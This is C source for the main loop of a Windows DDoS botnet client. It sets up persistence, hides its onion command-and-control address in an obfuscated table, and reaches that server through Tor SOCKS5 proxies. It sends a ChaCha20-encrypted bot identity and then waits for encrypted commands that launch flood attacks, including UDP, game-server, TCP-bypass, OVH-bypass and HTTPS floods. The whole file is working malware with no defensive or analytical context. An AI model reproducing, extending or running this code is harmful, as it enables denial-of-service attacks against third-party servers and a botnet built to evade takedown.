#define _WIN32_WINNT 0x0600
#include "headers/includes.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")

#include "headers/attacks.h"
#include "headers/chacha20.h"
#include "headers/cnc_protocol.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/config.h"
#include "headers/tor.h"
#include "headers/utils.h"
#include "headers/utils.h"

int global_sock = -1;
static uint8_t global_key[32];

struct attack_data {
    char ip[16]; int port; int duration; uint8_t method;
    struct attack_option *opts; uint8_t opts_len;
};

DWORD WINAPI attack_thread(LPVOID arg) {
    struct attack_data *data = (struct attack_data *)arg;
    switch(data->method) {
        case ATTACK_UDP: attack_udp_generic(data->ip, data->port, data->duration, data->opts, data->opts_len); break;
        case ATTACK_HEX: attack_udp_hex(data->ip, data->port, data->duration, data->opts, data->opts_len); break;
        case ATTACK_UDPTHREADS: attack_udp_threads(data->ip, data->port, data->duration, data->opts, data->opts_len); break;
        case ATTACK_UDP_GAME: attack_udp_game(data->ip, data->port, data->duration, data->opts, data->opts_len); break;
        case ATTACK_TCP_BYPASS: attack_tcp_bypass(data->ip, data->port, data->duration, data->opts, data->opts_len); break;
        case ATTACK_UDPLEGIT: attack_udp_legit(data->ip, data->port, data->duration, data->opts, data->opts_len); break;
        case ATTACK_OVH: attack_udp_ovh(data->ip, data->port, data->duration, data->opts, data->opts_len); break;
        case ATTACK_HTTPS: {
            char *domain = attack_get_opt_str(data->opts_len, data->opts, ATK_OPT_DOMAIN, data->ip);
            attack_app_https(domain, data->duration, data->opts, data->opts_len);
            break;
        }
    }
    if (data->opts != NULL) {
        for (int i = 0; i < data->opts_len; i++) free(data->opts[i].val);
        free(data->opts);
    }
    free(data); return 0;
}


void process_binary_command(const uint8_t *data, size_t len) {
    if (len < 1) return;
    if (data[0] == MSG_TYPE_ATTACK) {
        PRINTF("[process] Received binary attack command (len: %zu)\n", len);
        uint8_t method; uint32_t ip; uint16_t port; uint32_t duration;
        struct attack_option *opts = NULL; uint8_t opts_len = 0;
        if (parse_attack(data, len, &method, &ip, &port, &duration, &opts, &opts_len) != 0) {
            PRINTF("[process] Error: Failed to parse attack\n");
            return;
        }
        PRINTF("[process] Attack parsed: Method %02x, Duration %d\n", method, duration);
        struct in_addr addr; addr.s_addr = ip;
        struct attack_data *adata = calloc(1, sizeof(struct attack_data));
        adata->method = method; util_strcpy(adata->ip, inet_ntoa(addr));
        adata->port = port; adata->duration = duration;
        adata->opts = opts; adata->opts_len = opts_len;
        if (CreateThread(NULL, 0, attack_thread, (LPVOID)adata, 0, NULL)) {
            PRINTF("[process] Attack thread created successfully\n");
        } else {
            PRINTF("[process] Error: Failed to create attack thread\n");
        }
    }
}

int main(int argc, char *argv[]) {
    WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &wsaData);
    rand_init(); table_init();

    if (argc >= 3 && util_strcmp(argv[1], "--cleanup") == 0) {
        if (GetFileAttributesA(argv[2]) != INVALID_FILE_ATTRIBUTES) {
            PRINTF("[main] Cleaning up: %s\n", argv[2]);
            util_cleanup(argv[2]);
        }
    }

    util_single_instance();

    util_persistence();
    tor_init();
    util_memset(global_key, 0, 32); util_strncpy((char *)global_key, ENC_KEY, 31);


    while(1) {
        global_sock = (int)socket(AF_INET, SOCK_STREAM, 0);
        if(global_sock == INVALID_SOCKET) { Sleep(5000); continue; }

        struct tor_proxy *proxy = tor_get_random();
        if (proxy == NULL) {
            closesocket(global_sock);
            Sleep(5000);
            continue;
        }

        struct sockaddr_in srv_addr;
        srv_addr.sin_family = AF_INET; srv_addr.sin_addr.s_addr = proxy->ip; srv_addr.sin_port = proxy->port;


        PRINTF("[main] Connection: %s:%d\n", inet_ntoa(srv_addr.sin_addr), ntohs(srv_addr.sin_port));

        DWORD timeout = 20000;
        setsockopt(global_sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
        setsockopt(global_sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

        if(connect(global_sock, (struct sockaddr *)&srv_addr, sizeof(srv_addr)) == SOCKET_ERROR) {
            PRINTF("[main] Connect failed: %d\n", WSAGetLastError());
            closesocket(global_sock); Sleep(2000); continue;
        }
        PRINTF("[main] Connected to proxy, starting handshake...\n");

        table_unlock_val(TABLE_CNC_ADDR);
        char *onion = table_retrieve_val(TABLE_CNC_ADDR, NULL);
        PRINTF("[main] Onion: %s\n", onion);
        if (tor_socks5_handshake(global_sock, onion, FAKE_CNC_PORT) < 0) {
            PRINTF("[main] Handshake failed\n");
            table_lock_val(TABLE_CNC_ADDR); closesocket(global_sock); Sleep(2000); continue;
        }
        table_lock_val(TABLE_CNC_ADDR);
        PRINTF("[main] Connected to CNC!\n");

        char bot_id[64]; get_bot_id(bot_id);
        uint8_t nonce[12]; for(int i = 0; i < 12; i++) nonce[i] = rand_next() % 256;
        uint8_t identity[113];
        serialize_identify(identity, bot_id, "x86", "manual");
        chacha20_encrypt(identity, 113, global_key, nonce);

        send(global_sock, (char *)nonce, 12, 0);
        send(global_sock, (char *)identity, 113, 0);
        PRINTF("[main] Identity Sent: %s. Waiting for commands...\n", bot_id);

        while(1) {
            fd_set readfds; FD_ZERO(&readfds); FD_SET(global_sock, &readfds);
            struct timeval tv = {50, 0};
            int sr = select(global_sock + 1, &readfds, NULL, NULL, &tv);

            if (sr > 0) {
                uint8_t r_nonce[12];
                int total_r = 0;

                PRINTF("[main] Data available on socket\n");

                while (total_r < 12) {
                    int r = recv(global_sock, (char *)r_nonce + total_r, 12 - total_r, 0);
                    if (r <= 0) break;
                    total_r += r;
                }

                if (total_r != 12) {
                    PRINTF("[main] Connection lost during nonce recv\n");
                    break;
                }

                uint8_t buffer[1024];
                util_zero(buffer, sizeof(buffer));
                int n = recv(global_sock, (char *)buffer, sizeof(buffer), 0);

                if (n <= 0) {
                    PRINTF("[main] Connection lost during command recv\n");
                    break;
                }

                PRINTF("[main] Received %d bytes of encrypted data. Decrypting...\n", n);
                chacha20_encrypt(buffer, n, global_key, r_nonce);

                PRINTF("[main] Decrypted. First byte (type): %02x\n", buffer[0]);
                process_binary_command(buffer, n);
            }
 else if (sr == 0) {
                uint8_t p_nonce[12]; for(int i = 0; i < 12; i++) p_nonce[i] = rand_next() % 256;
                uint8_t ping[1] = {MSG_TYPE_PING};
                chacha20_encrypt(ping, 1, global_key, p_nonce);
                if (send(global_sock, (char *)p_nonce, 12, 0) == -1) break;
                if (send(global_sock, (char *)ping, 1, 0) == -1) break;
                PRINTF("[main] Ping Sent\n");
            } else {
                break;
            }
        }
        closesocket(global_sock); Sleep(5000);
    }
    return 0;
}
